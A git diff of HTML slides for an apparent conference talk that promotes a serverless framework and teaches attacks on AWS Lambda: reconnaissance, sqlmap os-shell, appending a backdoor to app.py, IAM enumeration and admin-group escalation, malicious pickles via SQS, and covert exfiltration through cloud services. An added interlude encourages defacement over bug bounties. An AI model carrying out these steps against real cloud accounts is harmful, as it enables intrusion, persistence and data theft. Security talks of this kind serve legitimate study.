@@ -166,9 +166,11 @@ PROPOSAL
 -->
 
 <div>
-
 Hello!
+</div>
 
+<div>
+Thank you for having me!
 </div>
 
 <div>
@@ -192,6 +194,10 @@ Author of
 </div>
 
 <div>
+(shameless plug alert)
+</div>
+
+<div>
 <pre>
 
 <em>
@@ -210,7 +216,31 @@ The <em>best damn</em> server-less framework in the world!
 </div>
 
 <div>
-First announced at Hack & Tell @ C-Base!
+Run <em>any Python web application</em> on AWS Lambda,
+</div>
+
+<div>
+build <em>event-driven</em> applications,
+</div>
+
+<div>
+scale to ~<em>500,000</em>* connections <em>per second</em> globally,
+</div>
+
+<div>
+with <em>no ops</em>,
+</div>
+
+<div>
+out of the box!
+</div>
+
+<div>
+First announced at <em>Hack & Tell</em> @ C-Base!
+</div>
+
+<div>
+Try it out!
 </div>
 
 <div>
@@ -219,6 +249,14 @@ Welcome to..
 
 <div>
 Gone in <em>60 Milliseconds</em>!
+</div>
+
+<div>
+<i>aka</i>
+</div>
+
+<div>
+Having a Sexy Title Gets Your Talk Accepted At Conferences
 </div>
 
 <div>
@@ -305,17 +343,17 @@ NOTES
 ¯\_(ツ)_/¯
 </div>
 
-<div>
+<!-- <div>
 <i>aka</i>
 </div>
-
-<div>
+ -->
+<!-- <div>
 Let's stick it to Jeff Bezos!
 </div>
 
 <div>
 <img src="http://b-i.forbesimg.com/thumbnails/blog_2535/pt_2535_3643_o.jpg?t=1378469756" style="width: 300%">
-</div>
+</div> -->
 
 <div>
 Quick poll!
@@ -351,7 +389,8 @@ The good old days:
 
 <div>
 <pre>
-$ python sqlmap.py -u "http://spoitabl.co/app.php?id=1" --batch --os-shell
+$ python sqlmap.py -u "http://spoitabl.co/app.php?id=1" \
+     --batch --os-shell
 </pre>
 </div>
 
@@ -375,6 +414,14 @@ Now:
 </div>
 
 <div>
+No permanent infrastructure!
+</div>
+
+<div>
+Code execution triggered by <em>cloud event sources</em>!
+</div>
+
+<div>
 Every request to an <em>isolated container</em>!
 </div>
 
@@ -383,11 +430,83 @@ Every request to an <em>isolated</em>* <em>container</em>!
 </div>
 
 <div>
-No permanent infrastructure!
+Saves time,
 </div>
 
 <div>
-Functions triggered by <em>cloud event sources</em>!
+saves money,
+</div>
+
+<div>
+saves money,
+</div>
+
+<div>
+lets you fires all your ops guys.
+</div>
+
+<div>
+(Sorry neckbeards.)
+</div>
+
+<div>
+Common patterns:
+</div>
+
+<div>
+Web server:
+</div>
+
+<div>
+API Gateway -> Lambda
+</div>
+
+<div>
+<img src="http://i.imgur.com/2ItfsNN.png">
+<!-- zappa -->
+</div>
+
+<div>
+Async data processing:
+</div>
+
+<div>
+S3 -> Lambda -> DynamoDB -> S3
+</div>
+
+<div>
+<img src="http://i.imgur.com/bDnspqM.png">
+<!-- serverless frameworks -->
+</div>
+
+<div>
+Chat Bots
+</div>
+
+<div>
+Streams / SNS / SES -> Lambda -> SES / SNS
+</div>
+
+<div>
+<img src="http://i.imgur.com/yQVxdDM.jpg">
+<!-- lots of events -->
+</div>
+
+<div>
+Big Data Processing
+</div>
+
+<div>
+S3 -> Lambda -> SQS -> EC2
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+..and loads more..
 </div>
 
 <div>
@@ -415,51 +534,7 @@ Boo! :(
 </div>
 
 <div>
-<i>"so long, shell.php!"</i>
-</div>
-
-<div>
-Common patterns:
-</div>
-
-<div>
-API Gateway -> Lambda
-</div>
-
-<div>
-<img src="http://i.imgur.com/2ItfsNN.png">
-<!-- zappa -->
-</div>
-
-<div>
-S3 -> Lambda -> DynamoDB -> S3
-</div>
-
-<div>
-<img src="http://i.imgur.com/bDnspqM.png">
-<!-- serverless frameworks -->
-</div>
-
-<div>
-Streams / SNS / SES -> Lambda -> SES
-</div>
-
-<div>
-<img src="http://i.imgur.com/yQVxdDM.jpg">
-<!-- lots of events -->
-</div>
-
-<div>
-S3 -> Lambda -> SQS -> EC2
-</div>
-
-<div>
-<img src="http://i.imgur.com/lgHgKtS.jpg">
-<!-- compute cluster -->
-</div>
-
-<div>
-..and many more!
+Container dies after the function returns!
 </div>
 
 <div>
@@ -471,23 +546,35 @@ Harder to <em>infiltrate</em>!
 </div>
 
 <div>
+:(
+</div>
+
+<div>
 Less common code,
 </div>
+
+<div>
+<i>"so long, wp-shell.php!"</i>
+</div>
+
 <div>
 isolated functions,
 </div>
+
 <div>
 isolated services,
 </div>
+
 <div>
 no users to escalate,
 </div>
+
 <div>
 no sysadmins to trick!
 </div>
 
 <div>
-:(
+(because you fired them)
 </div>
 
 <div>
@@ -497,9 +584,11 @@ Harder to <em>persist</em>!
 <div>
 Read only file system!
 </div>
+
 <div>
 Sub-second lifecycle!
 </div>
+
 <div>
 No init system to infect!
 </div>
@@ -515,12 +604,15 @@ Hard to <em>exfiltrate</em>!
 <div>
 Virtual Private Cloud!
 </div>
+
 <div>
 Function-specific roles!
 </div>
+
 <div>
 Strict permissioning!
 </div>
+
 <div>
 No reverse shell!
 </div>
@@ -541,12 +633,12 @@ AWW HELL NAW DOGG!
 When <span class="grey">G̶o̶d̶</span> <em>Bezos</em> closes a door, he opens a window.
 </div>
 
-<div>
+<!-- <div>
 <img src="http://cp91279.biography.com/1000509261001/1000509261001_1791235392001_Bio-Biography-Jeff-Bezos-LF.jpg">
-</div>
+</div> -->
 
 <div>
-<img src="https://camo.githubusercontent.com/cb7bc157a9c9a0ff1d93baf24d9833e2fa67779f/687474703a2f2f692e696d6775722e636f6d2f366d644e58506c2e706e67">
+<img src="https://camo.githubusercontent.com/cb7bc157a9c9a0ff1d93baf24d9833e2fa67779f/687474703a2f2f692e696d6775722e636f6d2f366d644e58506c2e706e67" style="width:180%">
 </div>
 
 <div>
@@ -554,6 +646,28 @@ Let's learn some..
 </div>
 
 <div>
+Reconnaisaince!
+</div>
+
+<div>
+Infiltration!
+</div>
+
+<div>
+Exploitation!
+</div>
+
+<div>
+Exfiltration!
+</div>
+
+<div>
+Clean Up!
+</div>
+
+<!-- <div>
+</div>
+
 <ul>
   <li>
     Reconnaisaince!
@@ -575,6 +689,30 @@ Let's learn some..
   </li>
 </ul>
 </div>
+ -->
+
+<!-- <div>
+<ul>
+  <li>
+    Reconnaisaince!
+  </li>
+    <li>
+  Infiltration!
+    </li>
+    <li>
+  Exploitation!
+    </li>
+    <li>
+  Exfiltration!
+    </li>
+    <li>
+  Persistence!
+    </li>
+    <li>
+  Clean Up!
+  </li>
+</ul>
+</div> -->
 
 <div>
 Part 0: <em>Reconnaisaince</em>!
@@ -732,7 +870,7 @@ Malicious binary files (ImageTragick, etc.)
 </div>
 
 <div>
-..and all your favorite web app exploit patterns!
+..and all (most) your favorite web app exploit patterns!
 </div>
 
 <div>
@@ -755,7 +893,7 @@ for key in bucket.list():
 </div>
 
 <div>
-<img src="http://i.imgur.com/UQg3uso.png" style="width: 300%">
+<img src="http://i.imgur.com/UQg3uso.png" style="width: 250%">
 </div>
 
 <div>
@@ -824,7 +962,6 @@ aka
 </i>
 </div>
 
-
 <div>
 <pre>$ find /</pre>
 </div>
@@ -846,6 +983,10 @@ aka
 
 <div>
 <pre>[ results ommited - see my Gists for full listing ]</pre>
+</div>
+
+<div>
+<em>TL</em>;<em>DR</em>:
 </div>
 
 <div>
@@ -901,6 +1042,14 @@ Good idea!
 </div>
 
 <div>
+"Instance metadata is data about your instance that you can use to configure or manage the running instance..
+</div>
+
+<div>
+..<em>anyone who can access the instance</em> can view its metadata. Therefore, you should take suitable precautions to <em>protect sensitive data</em>."
+</div>
+
+<div>
   <pre>
   ami-id
   ami-launch-index
@@ -932,7 +1081,15 @@ requests.get("<em>http://169.254.169.254/latest/meta-data/</em>")
 </div>
 
 <div>
-Nice idea, doesn't work :(
+Nice idea,
+</div>
+
+<div>
+doesn't work :(
+</div>
+
+<div>
+(but remember that if you're attacking EC2!)
 </div>
 
 <div>
@@ -1014,7 +1171,11 @@ Enter: AWS <em>Identity</em> and <em>Access Management</em> (IAM)
 </div>
 
 <div>
-Sounds bad. It is.
+Sounds bad.
+</div>
+
+<div>
+It is.
 </div>
 
 <div>
@@ -1038,7 +1199,7 @@ The good news:
 </div>
 
 <div>
-Almost everything fun we're going to do depends on slightly <em>wonky IAM</em>..
+Almost everything fun we're going to do depends on <i>slightly</i> <em>wonky IAM</em>..
 </div>
 
 <div>
@@ -1046,7 +1207,7 @@ Almost everything fun we're going to do depends on slightly <em>wonky IAM</em>..
 </div>
 
 <div>
-..but that's common.
+(..but that's pretty common.)
 </div>
 
 <div>
@@ -1160,6 +1321,10 @@ $ cat backdoor >> /var/task/app.py</pre>
 </div>
 
 <div>
+<em>X</em>
+</div>
+
+<div>
 :(
 </div>
 
@@ -1168,11 +1333,11 @@ $ cat backdoor >> /var/task/app.py</pre>
 </div>
 
 <div>
-..and even if you could write to it, it would only live for <em>40 milliseconds</em>.
+..and even if you could write to it, it would only live for ~<em>60 milliseconds</em>*.
 </div>
 
 <div>
-<i>"But.. where can I put my tools?.."</i>
+<i>"But.. where can I put my beloved tools?.."</i>
 </div>
 
 <div>
@@ -1218,6 +1383,18 @@ Yay! :)
 </div>
 
 <div>
+(as long as the function is kept-warm in memory)
+</div>
+
+<div>
+(~4m:30s)
+</div>
+
+<div>
+(Somebody violated an NDA to tell you that)
+</div>
+
+<div>
 This applies to long-running <em>processes</em> too!
 </div>
 
@@ -1226,7 +1403,7 @@ Linux x86_64 nmap, metasploit, sqlmap, hydra, <em>awscli</em>, etc..
 </div>
 
 <div>
-<i>"So I have some tools and some keys.. what can I do now?"</i>
+<i>"So I have some keys.. and some tools.. what can I do now?"</i>
 </div>
 
 <div>
@@ -1238,7 +1415,8 @@ First, see what we're allowed to do:
 aws iam list-policies --scope Local
 aws iam list-roles
 aws iam get-policy-version --policy-arn $POLICYARN --version-id v1
-aws iam get-role-policy --role-name $ROLENAME --policy-name $POLICYNAME
+aws iam get-role-policy --role-name $ROLENAME \
+    --policy-name $POLICYNAME
 </pre>
 </div>
 
@@ -1249,23 +1427,23 @@ And if we're lucky..
 <div>
 <pre>
 {
-    "PolicyVersion": {
-        "CreateDate": "2016-01-25T00:28:22Z",
-        "VersionId": "v1",
-        "Document": {
-            "Version": "2012-10-17",
-            "Statement": [
-                {
-                    "Action": [
-                        "<em>*</em>:*</em>"
-                    ],
-                    "Resource": "arn:aws:<em>*</em>:<em>*</em>:<em>*</em>:<em>*</em>",
-                    "Effect": "Allow"
-                },
-            ]
+  "PolicyVersion": {
+    "CreateDate": "2016-01-25T00:28:22Z",
+    "VersionId": "v1",
+    "Document": {
+      "Version": "2012-10-17",
+      "Statement": [
+        {
+          "Action": [
+            "<em>*</em>:*</em>"
+          ],
+          "Resource": "arn:aws:<em>*</em>:<em>*</em>:<em>*</em>:<em>*</em>",
+          "Effect": "Allow"
         },
-        "IsDefaultVersion": true
-    }
+      ]
+    },
+    "IsDefaultVersion": true
+  }
 }
 </pre>
 </div>
@@ -1302,7 +1480,83 @@ aws iam add-user-to-group --user-name ghost --group-name Admins
 </div>
 
 <div>
+<i>~~ a brief interlude ~~</i>
+</div>
+
+<div>
+If you <em>do</em> hit the jackpot..
+</div>
+
+<div>
+..<em>don't</em> just mine BitCoin!
+</div>
+
+<div>
+..<em>don't</em> sell user info to spammers!
+</div>
+
+<div>
+..<em>don't</em> claim a bug bounty!
+</div>
+
+<div>
+..<em>don't</em> snitch to TLAs!
+</div>
+
+<div>
+..<em>don't</em> even send it Julian!
+</div>
+
+<div>
+Espionage is <em>boring</em>!
+</div>
+
+<div>
+Use your skills for <em>awesome</em>!
+</div>
+
+<div>
+Put up your <em>badass hacking crew</em> name!
+</div>
+
+<!-- <div>
+Bring back <em>website defacement</em>!
+</div> -->
+
+<div>
+Replace a company logo with a <em>cool skull gif</em>!
+</div>
+
+<div>
+Give a shout-out to your <em>IRC homies</em>!
+</div>
+
+<div>
+u53 <em>numb3r5</em> f0r v0w3l5!
+</div>
+
+<div>
+Basically bring 1999 back
+</div>
+
+<div>
+aesthetic > $$$
+</div>
+
+<div>
+aesthetic -> $$$
+</div>
+
+<div>
+<i>~~ resuming normal programming ~~</i>
+</div>
+
+<div>
 Far more likely:
+</div>
+
+<div>
+(semi-)strict permissioning
 </div>
 
 <div>
@@ -1410,7 +1664,7 @@ Or some combination thereof!
 </div>
 
 <div>
-<i>"So how can we use that to our advantage?"</i>
+<i>"So how can we abuse that for nefarious purposes?"</i>
 </div>
 
 <div>
@@ -1422,7 +1676,15 @@ aka
 </div>
 
 <div>
-<i>"Take the money and run"</i>
+<i>Take the money and run</i>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>The fun part</i>
 </div>
 
 <div>
@@ -1430,10 +1692,26 @@ TL;DR:
 </div>
 
 <div>
-Use <em>tags</em>, <em>meta-information</em>, and <em>cloud services</em> themselves to shuttle information when you can't use direct network connections.
+Whn you don't have a direct network connection,
 </div>
 
 <div>
+use <em>tags</em>,
+</div>
+
+<div>
+ <em>meta</em>-information,
+</div>
+
+<div>
+and <em>cloud services themselves</em>
+</div>
+
+<div>
+ to shuttle information out of the cloud.
+</div>
+
+<!-- <div>
 Super easy mode:
 </div>
 
@@ -1458,7 +1736,7 @@ Super easy mode:
 
 <div>
 Just `return` through the API Gateway!
-</div>
+</div> -->
 
 <div>
 Easy mode:
@@ -1617,11 +1895,19 @@ VPC exfiltration!
 </div>
 
 <div>
+<i>"Woah woah woah, hol-dup, what's a VPC?"</i>
+</div>
+
+<div>
 "Amazon VPC provides <em>advanced security features</em> such as security groups and network access control lists to enable inbound and outbound filtering at the instance level and subnet level."
 </div>
 
 <div>
-Sounds bad. It is.
+Sounds bad.
+</div>
+
+<div>
+It is.
 </div>
 
 <div>
@@ -1669,7 +1955,7 @@ But.. we don't even need to actually use the VPC network!
 </div>
 
 <div>
-Exfil from a VPC without touching the VPC network
+Exfil from a VPC without touching the VPC network:
 </div>
 
 <div>
@@ -1749,7 +2035,7 @@ Step 2: Use SQS + malicious pickle to infect Celery machine inside VPC
 </div>
 
 <div>
-Okay - now what?
+<i>"Okay - now what?"</i>
 </div>
 
 <div>
@@ -1812,7 +2098,11 @@ aws ec2 describe-network-interfaces
 </div>
 
 <div>
-Boom, baby!
+<i>"Boom, baby!"</i>
+</div>
+
+<div>
+<i>It gets better!</i>
 </div>
 
 <div>
@@ -1868,7 +2158,23 @@ Be creative!
 </div>
 
 <div>
+There are TONS of AWS services to try!
+</div>
+
+<div>
 A <em>single overlapping permission</em> and be enough for data exfiltration!
+</div>
+
+<div>
+A <em>single overlapping <strike>permission</strike> service</em> and be enough for data exfiltration!
+</div>
+
+<div>
+SQS Queue Length -> Octal Value
+</div>
+
+<div>
+Number of ENIs attached, size of DynamoDB table
 </div>
 
 <div>
@@ -2001,6 +2307,12 @@ One better:
 Think <em>serverlessly</em>!
 </div>
 
+<!-- http://imgur.com/a/cGInz -->
+
+<div>
+<img src="http://i.imgur.com/R4ipPvj.jpg">
+</div>
+
 <div>
   <ul>
     <li>Hide malware in old function code</li>
@@ -2038,6 +2350,14 @@ response = self.lambda_client.update_function_code(FunctionName=function_name, Z
 
 <div>
 <i>Part 5: <em>Cleaning Up</em></i>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+Boring mode
 </div>
 
 <div>
@@ -2276,7 +2596,7 @@ All Lambda executions have an ID
 -->
 
 <div>
-Part 4: <em>Synthesis</em>
+Part 6: <em>Synthesis</em>
 </div>
 
 <div>
